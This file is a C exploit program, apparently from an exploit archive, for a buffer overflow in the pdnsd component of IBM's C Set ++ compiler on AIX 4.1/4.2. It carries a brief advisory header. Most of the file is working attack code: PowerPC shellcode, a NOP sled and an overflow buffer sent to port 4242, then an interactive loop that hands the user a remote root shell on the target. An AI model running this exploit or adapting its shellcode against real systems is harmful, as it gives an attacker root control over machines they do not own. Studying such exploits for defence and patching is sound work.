// source: https://www.securityfocus.com/bid/3237/info

The Source Code Browser's Program Database Name Server Daemon (pdnsd) component of the C Set ++ compiler for AIX contains a remotely exploitable buffer overflow. This vulnerability allows local or remote attackers to compromise root privileges on vulnerable systems.

/*## copyright LAST STAGE OF DELIRIUM oct 1999 poland        *://lsd-pl.net/ #*/
/*## pdnsd                                                                   #*/

/*   note: to avoid potential system hang-up please, first obtain the exact   */
/*   AIX OS level with the use of some OS fingerprinting method               */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

#define ADRNUM 4000
#define NOPNUM 4800
#define ALLIGN 1

#define SCAIX41 "\x03\x68\x41\x5e\x6d\x7f\x6f\xd6\x57\x56\x55\x53"
#define SCAIX42 "\x02\x71\x46\x62\x76\x8e\x78\xe7\x5b\x5a\x59\x58"

char syscallcode[]=
    "\x7e\x94\xa2\x79"     /* xor.    r20,r20,r20            */
    "\x40\x82\xff\xfd"     /* bnel    <syscallcode>          */
    "\x7e\xa8\x02\xa6"     /* mflr    r21                    */
    "\x3a\xc0\x01\xff"     /* lil     r22,0x1ff              */
    "\x3a\xf6\xfe\x2d"     /* cal     r23,-467(r22)          */
    "\x7e\xb5\xba\x14"     /* cax     r21,r21,r23            */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x20"     /* bctr                           */
    "\xff\xff\xff\xff"
    "\xff\xff\xff\xff"
    "\xff\xff\xff\xff"
    "\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6            */
    "\x44\xff\xff\x02"     /* svca    0x0                    */
    "\x3a\xb5\xff\xf8"     /* cal     r21,-8(r21)            */
;

char findsckcode[]=
    "\x2c\x74\x12\x34"     /* cmpi    cr0,r20,0x1234         */
    "\x41\x82\xff\xfd"     /* beql    <findsckcode>          */
    "\x7f\x08\x02\xa6"     /* mflr    r24                    */
    "\x3b\x36\xfe\x2d"     /* cal     r25,-467(r22)          */
    "\x3b\x40\x01\x01"     /* lil     r26,0x16               */
    "\x7f\x78\xca\x14"     /* cax     r27,r24,r25            */
    "\x7f\x69\x03\xa6"     /* mtctr   r27                    */
    "\x4e\x80\x04\x20"     /* bctr                           */
    "\xa3\x78\xff\xfe"     /* lhz     r27,-2(r24)            */
    "\xa3\x98\xff\xfa"     /* lhz     r28,-6(r24)            */
    "\x7c\x1b\xe0\x40"     /* cmpl    cr0,r27,r28            */
    "\x3b\x36\xfe\x59"     /* cal     r25,-423(r22)          */
    "\x41\x82\xff\xe4"     /* beq     <findsckcode+20>       */
    "\x7f\x43\xd3\x78"     /* mr      r3,r26                 */
    "\x38\x98\xff\xfc"     /* cal     r4,-4(r24)             */
    "\x38\xb8\xff\xf4"     /* cal     r5,-12(r24)            */
    "\x93\x38\xff\xf4"     /* st      r25,-12(r24)           */
    "\x88\x55\xff\xf6"     /* lbz     r2,-10(r21)            */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x37\x5a\xff\xff"     /* ai.     r26,r26,-1             */
    "\x2d\x03\xff\xff"     /* cmpi    cr2,r3,-1              */
    "\x40\x8a\xff\xc8"     /* bne     cr2,<findsckcode+32>   */
    "\x40\x82\xff\xd8"     /* bne     <findsckcode+48>       */
    "\x3b\x36\xfe\x03"     /* cal     r25,-509(r22)          */
    "\x3b\x76\xfe\x02"     /* cal     r27,-510(r22)          */
    "\x7f\x23\xcb\x78"     /* mr      r3,r25                 */
    "\x88\x55\xff\xf7"     /* lbz     r2,-9(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x7c\x7a\xda\x14"     /* cax     r3,r26,r27             */
    "\x7e\x84\xa3\x78"     /* mr      r4,r20                 */
    "\x7f\x25\xcb\x78"     /* mr      r5,r25                 */
    "\x88\x55\xff\xfb"     /* lbz     r2,-5(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x37\x39\xff\xff"     /* ai.     r25,r25,-1             */
    "\x40\x80\xff\xd4"     /* bge     <findsckcode+100>      */
;

char shellcode[]=
    "\x7c\xa5\x2a\x79"     /* xor.    r5,r5,r5               */
    "\x40\x82\xff\xfd"     /* bnel    <shellcode>            */
    "\x7f\xe8\x02\xa6"     /* mflr    r31                    */
    "\x3b\xff\x01\x20"     /* cal     r31,0x120(r31)         */
    "\x38\x7f\xff\x08"     /* cal     r3,-248(r31)           */
    "\x38\x9f\xff\x10"     /* cal     r4,-240(r31)           */
    "\x90\x7f\xff\x10"     /* st      r3,-240(r31)           */
    "\x90\xbf\xff\x14"     /* st      r5,-236(r31)           */
    "\x88\x55\xff\xf4"     /* lbz     r2,-12(r21)            */
    "\x98\xbf\xff\x0f"     /* stb     r5,-241(r31)           */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x20"     /* bctr                           */
    "/bin/sh"
;

char nop[]="\x7f\xff\xfb\x78";

main(int argc,char **argv){
    char buffer[10000],address[4],*b;
    int i,n,l,cnt,sck;
    struct hostent *hp;
    struct sockaddr_in adr;

    printf("copyright LAST STAGE OF DELIRIUM oct 1999 poland  //lsd-pl.net/\n");
    printf("pdnsd for AIX 4.1 4.2 PowerPC/POWER\n\n");

    if(argc!=3){
        printf("usage: %s address 41|42\n",argv[0]);exit(-1);
    }

    switch(atoi(argv[2])){
    case 41: memcpy(&syscallcode[32],SCAIX41,12); break;
    case 42: memcpy(&syscallcode[32],SCAIX42,12); break;
    default: exit(-1);
    }

    sck=socket(AF_INET,SOCK_STREAM,0);
    adr.sin_family=AF_INET;
    adr.sin_port=htons(4242);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){
        perror("error");exit(-1);
    }

    l=ADRNUM+NOPNUM+strlen(shellcode);
    *((unsigned long*)address)=htonl(0x2ff20908+(NOPNUM>>1));

    i=sizeof(struct sockaddr_in);
    if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
        struct netbuf {unsigned int maxlen;unsigned int len;char *buf;}nb;
        ioctl(sck,(('S'<<8)|2),"sockmod");
        nb.maxlen=0xffff;
        nb.len=sizeof(struct sockaddr_in);;
        nb.buf=(char*)&adr;
        ioctl(sck,(('T'<<8)|144),&nb);
    }
    n=ntohs(adr.sin_port);
    printf("port=%d connected! ",n);fflush(stdout);

    findsckcode[0+2]=(unsigned char)((n&0xff00)>>8);
    findsckcode[0+3]=(unsigned char)(n&0xff);

    b=buffer;
    *((unsigned long*)b)=htonl(l);
    b+=4;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(syscallcode);i++) *b++=syscallcode[i];
    for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
    for(i=0;i<strlen(shellcode);i++)   *b++=shellcode[i];
    for(i=0;i<ALLIGN;i++) *b++=address[i%4];
    for(i=0;i<ADRNUM;i++) *b++=address[i%4];
    *b=0;

    write(sck,buffer,4+l-1);sleep(3);
    send(sck,"x",1,0);
    printf("sent!\n");

    write(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}